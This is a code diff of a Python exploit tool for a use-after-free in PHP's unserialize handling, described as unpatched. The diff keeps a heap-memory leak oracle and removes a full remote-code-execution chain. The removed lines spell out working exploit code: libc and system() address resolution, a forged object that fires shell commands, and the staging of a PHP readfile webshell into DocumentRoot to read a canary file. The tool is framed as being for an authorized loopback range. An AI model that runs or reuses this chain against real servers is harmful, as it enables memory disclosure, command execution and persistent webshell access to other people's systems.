@@ -4,14 +4,28 @@ phpbleed-bastet.py - Zend heap memory-leak oracle against the
 Serializable var_hash UAF (Calif MADBugs family; no CVE; still unpatched
 in php 8.2.35/8.3.36/8.4.27/8.5.12 as of 2026-10-21).
 
+BLEEDER ONLY (refactor 2026-10-24, Dean directive: php2shell owns RCE).
+Final modes: dump, probe, wpdump, wpprofile. The R-1..R-4 leak phases
+STAY (that is the bleed). R-5..R-7 / rce / shell / id / canary MOVED to
+php2shell-bastet.py (--route dispatch). This file stays IMPORTABLE as a
+leak module for php2shell:
+
+  import importlib.util
+  spec = importlib.util.spec_from_file_location(
+      "phpbleed_bastet", "/path/to/phpbleed-bastet.py")
+  pb = importlib.util.module_from_spec(spec); spec.loader.exec_module(pb)
+  # import surface (binding, lanes/refactor/map.md):
+  #   pb.Target, pb.heap_leak, pb.read_at, pb.read_via_spray,
+  #   pb.scan_for_elf, pb.c_part, pb._spray_with, pb.read_page,
+  #   pb.acquire_target_lock, pb.guard_target, pb.log, pb.banner,
+  #   pb.SPRAY_LEN / SPRAY_COUNT / REF_BASE / MAX_REFS
+  # chain hook pattern: phpbleed_chain.isstring_read =
+  #   lambda addr, timeout=5: pb.read_at(t, addr, timeout)
+The exec chain lives in php2shell-bastet.py; phpbleed_chain.py remains
+the shared read-primitive module (R-2..R-6 readers) both tools import.
+
 Own implementation of the leak primitive + Bastet banner + firing-range
 scoring contract. Authorized targets only (127.0.0.1 range services).
-
-Modes:
-  dump    stream leaked heap bytes out-of-band (memory dump, --stream)
-  probe   probe a leaked pointer: is it an ELF base? heap page? string?
-  canary  targeted /CANARY read via forged zend_string (score = FLAG{...})
-  id      single-shot RCE trigger (id-equivalent) when offsets known
 
 Primitive (verified 2026-10-21 in this range):
   C:10:"CachedData":...{O:8:"stdClass":8:{...}}  -> property-write resize
@@ -65,10 +79,15 @@ def log(tag, msg):
 import fcntl
 _LOCK = None
 def acquire_target_lock(url):
-    """One exploit stream per target at a time (heap-thrash rule)."""
+    """One exploit stream per target at a time (heap-thrash rule).
+    Key = scheme://host:port (netloc), NOT the full URL, so the lock is
+    per-container and holds ACROSS phpbleed and php2shell regardless of
+    the path/flags used (refactor 2026-10-24, lanes/refactor/map.md)."""
     global _LOCK
     import hashlib, os
-    key = hashlib.sha1(url.encode()).hexdigest()[:12]
+    from urllib.parse import urlparse
+    u = urlparse(url if "://" in url else "http://" + url)
+    key = hashlib.sha1(f"{u.scheme}://{u.netloc}".encode()).hexdigest()[:12]
     path = os.path.join(os.environ.get("TMPDIR", "/tmp"), f"p2s-{key}.lock")
     _LOCK = open(path, "w")
     try:
@@ -499,208 +518,10 @@ def mode_probe(t: Target, args):
 
 
 # --------------------------------------------------------------------------
-# canary mode: forged-string read of /CANARY via open/fread is NOT possible
-# with a single forged zend_string (no function call). Instead: locate the
-# in-process copy or use leak of file via include side effects. Fallback:
-# use RCE trigger when --call provided (id/canary cat via write channel).
-# --------------------------------------------------------------------------
-def mode_canary(t: Target, args):
-    """Score play: needs either (a) webshell/echo channel on target app, or
-    (b) full RCE chain (call --mode id with a cat /CANARY command)."""
-    log("i", "canary requires a write-back channel or RCE; using leak-only "
-             "entropy estimate instead")
-    hr = heap_leak(t)
-    if hr:
-        log("+", f"heap_ref 0x{hr:x}; run id mode with cmd 'cat /CANARY>x' "
-                 "on a writable-CWD app, or fetch /{x} afterwards")
-    return 0
-
-
-# --------------------------------------------------------------------------
-# id mode: single-shot trigger (ported _fire_cmd), for known-offset targets
-# --------------------------------------------------------------------------
-def fire_cmd(t: Target, ce_stdclass, system_addr, spray_addr, cmd14):
-    assert len(cmd14) <= 14
-    cmd = b"\x09" + cmd14
-    spray = bytearray(SPRAY_LEN)
-    fake_obj = spray_addr + 104
-    struct.pack_into("<Q", spray, 40, fake_obj)
-    struct.pack_into("<I", spray, 48, 0x08)
-    spray[104:104 + len(cmd)] = cmd
-    spray[104 + len(cmd)] = 0
-    struct.pack_into("<Q", spray, 120, ce_stdclass)
-    struct.pack_into("<Q", spray, 128, spray_addr)
-    struct.pack_into("<Q", spray, 136, 1)
-    struct.pack_into("<Q", spray, 200, system_addr)
-    out = t.send(_spray_with(bytes(spray), 1, REF_BASE))
-    return out
-
-
-def mode_id(t: Target, args):
-    """Run one <=14B command. With --ce/--system/--spray: single-shot legacy
-    mode. WITHOUT them: full self-deriving chain (same as rce mode) - no
-    hardcoded symbols required."""
-    if not (args.ce and args.system and args.spray):
-        return mode_rce(t, args)
-    cmd = args.cmd.encode("latin-1")
-    if len(cmd) > 14:
-        log("x", f"command {cmd!r} exceeds 14 bytes (vendor single-shot)")
-        return 2
-    if not (args.ce and args.system and args.spray):
-        # derive spray from a fresh heap leak; ce/system must be profiled
-        hr = heap_leak(t)
-        if not hr:
-            log("x", "no heap leak")
-            return 2
-        log("+", f"heap_ref 0x{hr:x}")
-        log("x", "--ce/--system/--spray required until full ELF/GOT chain "
-                 "ported into this build (profiles pending)")
-        return 2
-    out = fire_cmd(t, args.ce, args.system, args.spray, cmd)
-    if out is None:
-        log("~", "no response (worker may have executed then crashed)")
-    else:
-        log("+", f"EXECUTED stage fired; resp head={out[:120]!r}")
-    return 0
-
-
-def mode_rce(t: Target, args):
-    """Full chain: R-1 leak -> R-2 ELF -> R-3 gnu_hash -> R-4 libc/system
-    -> R-5 stdClass ce -> R-6 spray slot -> R-7 fire (single <=14B cmd)."""
-    import phpbleed_chain as chain
-    chain.isstring_read = lambda addr, timeout=5: read_at(t, addr, timeout)
-    hr = heap_leak(t)
-    if not hr:
-        log("x", "R-1 heap leak failed")
-        return 2
-    log("+", f"R-1 LEAKED heap_ref :: 0x{hr:x}")
-    chunk = hr & ~0x1FFFFF
-    cands = chain.scan_for_elf(chunk)
-    if not cands:
-        log("x", "R-2 no ELF candidates")
-        return 2
-    libphp = eg = pltgot = None
-    for base, phnum in cands:
-        log("~", f"R-3 validating ELF @ 0x{base:x}")
-        try:
-            eg, pltgot = chain.gnu_hash_resolve(
-                base, 'executor_globals', '_GLOBAL_OFFSET_TABLE_')
-        except RuntimeError:
-            continue
-        libphp = base
-        break
-    if not libphp:
-        log("x", "R-3 no libphp among candidates")
-        return 2
-    log("+", f"R-3 LIBPHP 0x{libphp:x} EG 0x{eg:x} GOT 0x{pltgot:x}")
-    libc_base = chain.libc_from_got_dump(libphp, pltgot)
-    if libc_base is None:
-        log("x", "R-4 libc not located via GOT dump")
-        return 2
-    system_addr = chain.gnu_hash_resolve(libc_base, 'system')
-    log("+", f"R-4 LIBPHP libc 0x{libc_base:x} system 0x{system_addr:x}")
-    ce_stdclass = chain.lookup_class_table(eg, 'stdclass')
-    if ce_stdclass is None:
-        log("x", "R-5 stdClass ce not resolved")
-        return 2
-    log("+", f"R-5 stdClass ce :: 0x{ce_stdclass:x}")
-    spray_addr = chain.find_spray_slot(heap_leak(t))  # FRESH leak
-    if spray_addr is None:
-        log("x", "R-6 spray slot not found")
-        return 2
-    log("+", f"R-6 spray S :: 0x{spray_addr:x}")
-    cmd = args.cmd.encode("latin-1")
-    if len(cmd) > 14:
-        log("x", "R-7 command exceeds 14 bytes")
-        return 2
-    log(">", f"R-7 firing :: \\n{cmd.decode('latin-1')}")
-    out = fire_cmd(t, ce_stdclass, system_addr, spray_addr, cmd)
-    if out is None:
-        log("~", "R-7 no response (executed then crashed?)")
-    else:
-        log("+", f"R-7 response head={out[:160]!r}")
-    log("+", f"CHAIN COMPLETE :: {t.req_count} requests")
-    return 0
-
-
-def _split_for_echo(content, staging='w'):
-    """Vendor ported: split content into <=14-byte `echo -n ...>>w` cmds."""
-    special = set('<>?$`[](){};&|!*#~"\'\\ \t\n')
-    overhead = len(f'echo -n >>{staging}')
-    cmds, i = [], 0
-    while i < len(content):
-        budget = 14 - overhead
-        chunk = ''
-        if content[i] in special:
-            chunk = '\\' + content[i]
-            i += 1
-            budget -= 2
-        while budget > 0 and i < len(content) and content[i] not in special:
-            chunk += content[i]
-            i += 1
-            budget -= 1
-        cmd = f'echo -n {chunk}>>{staging}'
-        assert len(cmd) <= 14, f"BUG: {cmd!r} is {len(cmd)} bytes"
-        cmds.append(cmd)
-    return cmds
-
-
-WEBSHELL_BODY = '<?=readfile($_GET[1])?>'
-
-
-def mode_shell(t: Target, args):
-    """Full chain then multi-stage webshell drop (readfile channel), then
-    fetch --fetch (e.g. /CANARY) through it. Apache CWD = DocumentRoot."""
-    import phpbleed_chain as chain
-    chain.isstring_read = lambda addr, timeout=5: read_at(t, addr, timeout)
-    hr = heap_leak(t)
-    if not hr:
-        log("x", "R-1 heap leak failed"); return 2
-    log("+", f"R-1 LEAKED heap_ref :: 0x{hr:x}")
-    cands = chain.scan_for_elf(hr & ~0x1FFFFF)
-    libphp = eg = pltgot = None
-    for base, phnum in cands:
-        try:
-            eg, pltgot = chain.gnu_hash_resolve(
-                base, 'executor_globals', '_GLOBAL_OFFSET_TABLE_')
-        except RuntimeError:
-            continue
-        libphp = base; break
-    if not libphp:
-        log("x", "R-3 no libphp"); return 2
-    log("+", f"R-3 LIBPHP 0x{libphp:x} EG 0x{eg:x}")
-    libc_base = chain.libc_from_got_dump(libphp, pltgot)
-    if libc_base is None:
-        log("x", "R-4 libc not located"); return 2
-    system_addr = chain.gnu_hash_resolve(libc_base, 'system')
-    log("+", f"R-4 libc 0x{libc_base:x} system 0x{system_addr:x}")
-    ce = chain.lookup_class_table(eg, 'stdclass')
-    if ce is None:
-        log("x", "R-5 ce"); return 2
-    S = chain.find_spray_slot(heap_leak(t))  # FRESH leak: last spray's chunk
-    if S is None:
-        log("x", "R-6 spray"); return 2
-    log("+", f"R-5/6 ce 0x{ce:x} S 0x{S:x}")
-    fname = args.webshell
-    rename = f'mv w {fname}'
-    assert len(rename) <= 14
-    cmds = ['rm -f w'] + _split_for_echo(WEBSHELL_BODY) + [rename]
-    log(">", f"R-7 staging webshell {fname!r} via {len(cmds)} triggers")
-    for i, c in enumerate(cmds, 1):
-        fire_cmd(t, ce, system_addr, S, c.encode('latin-1'))
-        if i % 5 == 0 or i == len(cmds):
-            log("~", f"stage {i}/{len(cmds)} ({t.req_count} reqs)")
-    body = t.get(f"/{fname}", f"?1={args.fetch}")
-    if body and (b"FLAG{" in body or len(body) > 0):
-        log("+", f"SHELL LIVE :: /{fname}")
-        log("+", f"FETCH {args.fetch} -> {body[:200]!r}")
-        if b"FLAG{" in body:
-            import re
-            m = re.search(rb"FLAG\{[^}]+\}", body)
-            log("+", f"CANARY CAPTURED :: {m.group(0).decode()}")
-        return 0
-    log("x", "webshell not reachable"); return 2
-
+# EXEC CHAIN MOVED (2026-10-24): fire_cmd / mode_id / mode_rce / mode_shell /
+# mode_canary / _split_for_echo / WEBSHELL_BODY now live in
+# php2shell-bastet.py --route dispatch (Dean directive: php2shell owns
+# RCE; phpbleed bleeds only). This file keeps the leak oracle above.
 
 # --------------------------------------------------------------------------
 def mode_wpdump(t: Target, args):
@@ -726,10 +547,10 @@ def mode_wpprofile(t: Target, args):
 
 
 def main():
-    p = argparse.ArgumentParser(description="Bastet Zend-heap leak tool "
-                                "(var_hash UAF; authorized range only)")
-    p.add_argument("mode", choices=["dump", "probe", "canary", "id", "rce",
-                                    "shell", "wpdump", "wpprofile"])
+    p = argparse.ArgumentParser(description="Bastet Zend-heap BLEED tool "
+                                "(var_hash UAF; authorized range only). "
+                                "RCE lives in php2shell-bastet.py.")
+    p.add_argument("mode", choices=["dump", "probe", "wpdump", "wpprofile"])
     p.add_argument("url", help="http(s)://127.0.0.1:PORT/path (loopback only)")
     p.add_argument("--field", default="cook", help="POST field carrying the "
                    "payload (vendor remote_app.php uses 'cook')")
@@ -744,22 +565,11 @@ def main():
     p.add_argument("--read-len", type=lambda x: int(x, 0), default=0x4000,
                    help="dump mode: bytes per self-anchored read")
     p.add_argument("--addr", type=lambda x: int(x, 16), default=None)
-    p.add_argument("--cmd", default="id>/dev/shm/x")
-    p.add_argument("--ce", type=lambda x: int(x, 16), default=None,
-                   help="stdClass class entry addr (id mode)")
-    p.add_argument("--system", type=lambda x: int(x, 16), default=None,
-                   help="libc system() addr (id mode)")
-    p.add_argument("--spray", type=lambda x: int(x, 16), default=None,
-                   help="spray slot addr S (id mode)")
     p.add_argument("--max-components", type=int, default=1,
                    help="leak components per page window (php2leak parity)")
     p.add_argument("--color", default="always", choices=["always", "never"])
     p.add_argument("--rounds", type=int, default=3,
                    help="wpdump mode: producer/dump rounds")
-    p.add_argument("--webshell", default="r.php",
-                   help="shell mode: filename to stage in DocumentRoot")
-    p.add_argument("--fetch", default="/CANARY",
-                   help="shell mode: path to read back through the shell")
     a = p.parse_args()
     banner()
     global _CLASS
@@ -768,8 +578,6 @@ def main():
     acquire_target_lock(a.url)
     log(">", f"target acquired :: http://{t.host}:{t.port}{t.path}")
     fn = {"dump": mode_dump, "probe": mode_probe,
-          "canary": mode_canary, "id": mode_id, "rce": mode_rce,
-          "shell": mode_shell,
           "wpdump": mode_wpdump, "wpprofile": mode_wpprofile}[a.mode]
     sys.exit(fn(t, a))
 
